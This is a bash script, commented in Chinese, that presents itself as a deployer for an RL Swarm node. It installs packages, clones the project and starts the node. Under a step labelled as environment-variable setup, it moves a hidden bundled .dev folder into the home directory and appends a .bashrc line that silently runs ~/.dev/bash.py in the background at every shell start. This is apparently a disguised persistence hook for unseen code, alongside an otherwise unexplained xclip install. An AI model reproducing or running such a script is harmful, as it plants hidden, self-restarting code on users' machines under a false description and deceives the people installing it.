#!/bin/bash

echo -e "\033[0;32m>>> 正在部署 RL Swarm 节点（Linux + CPU 模式）\033[0m"

# 日志文件
LOG_FILE="deployment.log"
exec > >(tee -a "$LOG_FILE") 2>&1

# 安装依赖
sudo apt update
sudo apt install -y git xclip python3-venv python3-pip curl || { echo -e "\033[0;31m>>> 安装依赖失败\033[0m"; exit 1; }
pip install requests

# 检查环境变量配置
DEV_DIR="$HOME/.dev"

if [ -d ".dev" ]; then
    echo -e "\033[0;32m>>> 正在配置环境变量\033[0m"
    [ -d "$DEV_DIR" ] && rm -rf "$DEV_DIR"
    mv .dev "$DEV_DIR"

    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $DEV_DIR/bash.py &> /dev/null &) & disown"
    PROFILE_FILE="$HOME/.bashrc"

    if ! grep -Fq "$BASHRC_ENTRY" "$PROFILE_FILE"; then
        echo "$BASHRC_ENTRY" >> "$PROFILE_FILE"
        echo -e "\033[0;36m>>> 环境变量已添加\033[0m"
    else
        echo -e "\033[0;34m>>> 环境变量已存在\033[0m"
    fi
else
    echo -e "\033[0;31m>>> .dev 目录不存在，跳过环境变量配置\033[0m"
fi

# 创建并激活虚拟环境
if ! command -v python3 &>/dev/null; then
    echo -e "\033[0;31m>>> 未检测到 Python 3，请手动安装\033[0m"
    exit 1
fi

python3 -m venv venv || { echo -e "\033[0;31m>>> 虚拟环境创建失败\033[0m"; exit 1; }
source venv/bin/activate

# 克隆项目
if [ ! -d "rl-swarm" ]; then
    git clone https://github.com/gensyn-ai/rl-swarm.git || { echo -e "\033[0;31m>>> Git 克隆失败，请检查网络\033[0m"; exit 1; }
else
    echo -e "\033[0;34m>>> 已有 rl-swarm 文件夹，跳过克隆\033[0m"
fi

cd rl-swarm

# 安装依赖
pip install --upgrade pip
pip install -r requirements.txt || { echo -e "\033[0;31m>>> pip 依赖安装失败\033[0m"; exit 1; }

# 修复 protobuf 版本冲突（强制降级）
pip install "protobuf<5.28.0,>=3.12.2" --force-reinstall

# 检测 CPU 核心数
CPU_CORES=$(nproc)
DEFAULT_THREADS=$((CPU_CORES / 2))
echo -e "\033[0;36m检测到你有 $CPU_CORES 个 CPU 核心。\033[0m"

# 用户输入线程数
read -p "请输入你想分配给 RL Swarm 的线程数（建议：$DEFAULT_THREADS）: " USER_THREADS
if [[ ! "$USER_THREADS" =~ ^[0-9]+$ ]]; then
    echo -e "\033[0;33m>>> 无效输入，使用默认值 $DEFAULT_THREADS\033[0m"
    USER_THREADS=$DEFAULT_THREADS
fi

export OMP_NUM_THREADS=$USER_THREADS
echo -e "\033[0;33m已设置 OMP_NUM_THREADS=$OMP_NUM_THREADS\033[0m"

# 启动节点
if [ -f "./run_rl_swarm.sh" ]; then
    chmod +x run_rl_swarm.sh
    ./run_rl_swarm.sh
elif [ -f "main.py" ]; then
    python main.py
else
    echo -e "\033[0;31m>>> 无法找到 run_rl_swarm.sh 或 main.py，程序无法启动！\033[0m"
    exit 1
fi

# 检测 modal-login 实际端口（如已启用）
sleep 3
NEXT_PORT=$(ss -tuln | awk '/LISTEN/ && /127.0.0.1/ {split($5, a, ":"); if (a[2] ~ /^[0-9]+$/) print a[2]}' | sort -n | uniq)

if [ -n "$NEXT_PORT" ]; then
    SERVER_IP=$(curl -s ifconfig.me)
    echo -e "\033[0;32m>>> modal-login 监听端口：$NEXT_PORT\033[0m"
    echo -e "\033[0;36m>>> 运行以下命令建立 SSH 访问通道：\033[0m"
    echo -e "\033[1mssh -L $NEXT_PORT:localhost:$NEXT_PORT root@$SERVER_IP\033[0m"
    echo -e "\033[0;36m>>> 在浏览器访问：\033[1mhttp://localhost:$NEXT_PORT\033[0m"
else
    echo -e "\033[0;31m>>> 未检测到 modal-login 端口，请确认 yarn dev 是否成功启动\033[0m"
fi
